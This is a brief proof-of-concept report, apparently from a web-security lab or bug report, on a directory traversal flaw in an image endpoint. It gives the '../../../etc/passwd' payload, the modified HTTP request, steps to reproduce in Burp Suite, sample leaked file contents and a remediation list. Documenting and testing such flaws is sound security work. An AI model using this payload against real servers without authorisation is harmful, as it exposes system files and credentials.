Directory Traversal Vulnerability PoC

Vulnerability Type

Directory Traversal / Path Traversal

CWE

CWE-22

Affected Endpoint

GET /image?filename=21.jpg HTTP/2

Payload Used

../../../etc/passwd

Modified Request

GET /image?filename=../../../etc/passwd HTTP/2 Host: vulnerable-target.com Cookie: session=YOUR_SESSION

Steps to Reproduce

  1. Open application in Burp Suite.
  2. Capture image/file request.
  3. Modify filename parameter.
  4. Insert traversal payload.
  5. Forward request.
  6. Observe sensitive file disclosure.

Successful Response Example

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin

Impact

  • Sensitive Information Disclosure
  • Credential Exposure
  • Configuration Leakage
  • Source Code Disclosure

Severity

HIGH

Remediation

  • Validate user input
  • Block ../ sequences
  • Use allowlisted files only
  • Restrict filesystem access
  • Use secure file APIs
